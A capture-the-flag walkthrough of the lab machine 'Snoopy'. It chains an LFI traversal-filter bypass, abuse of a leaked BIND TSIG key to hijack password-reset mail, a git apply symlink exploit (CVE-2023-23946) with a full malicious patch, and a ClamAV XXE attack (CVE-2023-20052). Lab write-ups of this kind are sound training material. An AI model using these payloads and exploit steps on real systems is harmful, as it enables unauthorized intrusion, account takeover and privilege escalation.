Summary
#

Snoopy is a hard-difficulty Linux machine that demonstrates how multiple seemingly low-impact misconfigurations can be chained into full system compromise. Initial access begins with exploiting a Local File Inclusion (LFI) vulnerability to disclose sensitive BIND9 configuration files and extract the TSIG key used for Dynamic DNS updates. By abusing this key, the mail.snoopy.htb DNS record is redirected to the attacker’s system, allowing interception of Mattermost password reset emails and takeover of a valid user account. Access to Mattermost exposes a custom server provisioning workflow that is abused with an SSH honeypot to capture the credentials of cbrown. From there, a vulnerable git apply sudo rule (CVE-2023-23946) is exploited through a symlink attack to escalate to sbrown. Finally, root access is obtained by abusing an XXE vulnerability in ClamAV (CVE-2023-20052), leaking the root user’s SSH private key during a privileged scan.

The endpoint that downloads the single PDF file is using URL with the file parameter as:

http://snoopy.htb/download?file=announcement.pdf

We can try checking if it is vulnerable to LFI or not. Testing for common payloads “../../../../../” failed but after analyzing the behaviour of the site with different formats revealed that the site is removing the “../” sequences. The application likely performs a single, non-recursive str_replace("../", “”, $input). Because the replacement only runs once, if we submit ….//, removing the single ../ substring from the middle leaves behind ../. Chaining several of these (….//….//….//….//etc/passwd) reconstructs a full traversal path after the filter runs. This is a classic non-recursive-sanitization bypass.

Pointing the payload to the /etc/passwd file downloads it successfully in a zip format.

We can try more LFI payloads for system enumeration and the site will zip the accessible files and sends it to us for download. To download the download.php file which is handling these downloads, we can use payload:

http://snoopy.htb/download?file=....//download.php

The file has following code

The download.php script dynamically creates a ZIP archive using PHP’s ZipArchive class. When the file GET parameter is supplied, it prepends the press_package/ directory to the user-controlled filename, performs a simple ../ string replacement with preg_replace(), verifies that the resulting file exists, and adds it to a temporary ZIP archive. If no file parameter is provided, the script packages every file inside the press_package/ directory. Finally, it serves the generated archive to the client as press_release.zip and deletes the temporary ZIP file from the server.

As the code is not using any function which can include and then execute PHP scripts, we can’t get RCE via php script inclusion. Let’s move towards downloading the contact.php to see what it contains via LFI:

http://snoopy.htb/download?file=....//forms/contact.php

The contact.php script acts as the backend for the website’s contact form. It loads the PHP_Email_Form library, accepts user-supplied input from the POST parameters (name, email, subject, and message), constructs an email, and sends it to a predefined recipient address using the library’s send() method.

When trying to download the mentioned PHP email library, the zip file that gets downloaded is empty so maybe the file doesn’t exist.

The DNS is using “ISC BIND 9” server. We can search for what pentests can be performed on it. Researching for it, we find one method that looks useful for our current scenario which is “Dynamic DNS (DDNS) Flaws”. This says that if weak or unauthenticatef policies are set, we can modify the DNS records remotely. The configuration of the server is stored in /etc/bind/named.conf and as we have LFI, we can see if we can access the file.

Downloading and reviewing the file we see the above contents. There is secret key based authentication setup for DNS records modification. It may become useful for us. Reviewing the /etc/bind/named.conf.local file shows content

The named.conf.local file contains the local BIND DNS configuration and defines the DNS zones for which the server is authoritative. In this case, the server is configured as the master for the snoopy.htb zone, with all DNS records stored in the /var/lib/bind/db.snoopy.htb zone file. The configuration also allows authenticated Dynamic DNS updates using the rndc-key TSIG key through the allow-update directive, while restricting DNS zone transfers to hosts within the 10.0.0.0/8 network via the allow-transfer directive. With this information at hand, we can update the DNS records to point the mail.snoopy.htb domain to our IP address and check if we can receive the reset password mail from Mattermost recovery feature. To modify the records, we can use nsupdate with the key file (rndc.key). Copy the key contents into a file:

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

With that set, we can go to the Mattermost password recovery feature and put an email address to get a recovery link. This time the website page outputs no error and our terminal shows the received email’s content:

The reset password link is given in the email which we can use to reset the password but before that, we need to clean it as it contains some encoding characters:

http://mm.snoopy.htb/reset_password_complete?token=3Diamxk=
r9msqsxxg5hcuoztwydqtu38w793z8fsmduqupimsz5tcpmo6s1d8smn4ee

Email bodies are often quoted-printable encoded. In this encoding, a trailing = at the end of a line is a soft line-break marker (not a real character), while =3D represents a literal =. To reconstruct the real link, remove the soft-break = characters and join the lines, then replace =3D with =.

So after cleaning, our link will look like:

http://mm.snoopy.htb/reset_password_complete?token=iamxkr9msqsxxg5hcuoztwydqtu38w793z8fsmduqupimsz5tcpmo6s1d8smn4ee

Visit the cleaned link and reset the password

Git Apply Symlink Abuse
#

We don’t have permissions to access the directory of sbrown. Checking the sudoers permissions with “sudo -l” revealed the following:

cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$

We can run the specific git apply command with the privileges of sbrown. git apply is a Git utility used to apply patch files, which contain changes to files in a repository. Researching vulnerabilities affecting this functionality reveals CVE-2023-23946. The vulnerability exploits git apply by crafting a malicious patch file that creates a symbolic link and then writes arbitrary file using it. We find a POC at GitHub.

To exploit the vulnerability, we first need to create a symlink pointing to the directory where we want to write files. To escalate to sbrown, we will need to write the SSH pblic key to its authorized_keys files so we can later log in using the corresponding private key. To create the symlink:

cbrown@snoopy:~$ mkdir /tmp/git-exploit && cd /tmp/git-exploit
cbrown@snoopy:/tmp/git-exploit$ ln -s /home/sbrown/.ssh symlink

Create SSH keys on attack system using :

└─$ ssh-keygen -t ed25519 -f key -N ""

Next we can copy the patch file content from the GitHub repo and edit it as follows:

diff --git a/symlink b/newsymlink
rename from symlink
rename to newsymlink
--
diff --git /dev/null b/newsymlink/authorized_keys
new file mode 100644
index 0000000..e47f4ea
--- /dev/null
+++ b/newsymlink/authorized_keys
@@ -0,0 +1 @@
+<Public-KEY HERE>
\ No newline at end of file

Add your public key in the placeholder.

This patch file does two things: first it renames the existing symlink (which points to /home/sbrown/.ssh) to newsymlink. Then it creates a new file authorized_keys inside newsymlink. Because newsymlink is still a symlink to /home/sbrown/.ssh, git actually writes the file through the symlink, landing at /home/sbrown/.ssh/authorized_keys.

As the user sbrown is also in devops group just like us, we can change the ownership of the directory so sbrown can also access the directory and create the newsymlink as specified in the patch:

cbrown@snoopy:/tmp/git-exploit$ chown :devops .
cbrown@snoopy:/tmp/git-exploit$ ls -la
total 12
drwxrwxr-x  2 cbrown devops 4096 Jul  9 15:44 .
drwxrwxrwt 13 root   root   4096 Jul  9 15:44 ..
-rw-rw-r--  1 cbrown cbrown  357 Jul  9 15:44 malicious.patch
lrwxrwxrwx  1 cbrown cbrown   17 Jul  9 15:41 symlink -> /home/sbrown/.ssh

To apply the malicious patch as sbrown now:

cbrown@snoopy:/tmp/git-exploit$ sudo -u sbrown /usr/bin/git apply -v malicious.patch 
[sudo] password for cbrown: 
Checking patch symlink => newsymlink...
Checking patch newsymlink/authorized_keys...
Applied patch symlink => newsymlink cleanly.
Applied patch newsymlink/authorized_keys cleanly.

Restrict permissions of the key file to 600 and log in with SSH using the private key:

└─$ chmod 600 key

└─$ ssh -i key sbrown@10.129.229.5

We can now access the user.txt present in sbrown’s home directory:

sbrown@snoopy:~$ ls -l

drwxrwxr-x 2 sbrown sbrown    4096 Jul  8 20:54 scanfiles
-rw-r----- 1 root   sbrown      33 Jul  8 17:16 user.txt

ClamAV XXE File Disclosure
#

Running sudo -l shows the clamscan command which we can run as root now:

sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:

Clamscan is a command-line antivirus utility, part of the ClamAV toolkit, used to scan files and directories for malware.

We can run the tool by specifying a file or directory to scan and –debug is used to show libclamav’s debug messages. We can take the version of the tool (ClamAV 1.0.0) and search for vulnerabilities. The mentioned version is affected by multiple vulnerabilities from which CVE-2023-20052 is the one which has XML External Entity (XXE) injection vulnerability in the DMG file parser that leaks sensitive data.

XXE (XML External Entity injection) occurs when an XML parser resolves externally-defined entities in untrusted input. If an attacker can supply a pointing to a local file (file:///…), and the parser expands it and reflects the value back, the attacker can read arbitrary files the parsing process has access to.

As the tool will run with the root privileges, we can try to leak SSH private keys if the root directory contains them. We can exploit this vulnerability by submitting a crafted DMG file to be scanned by ClamAV.
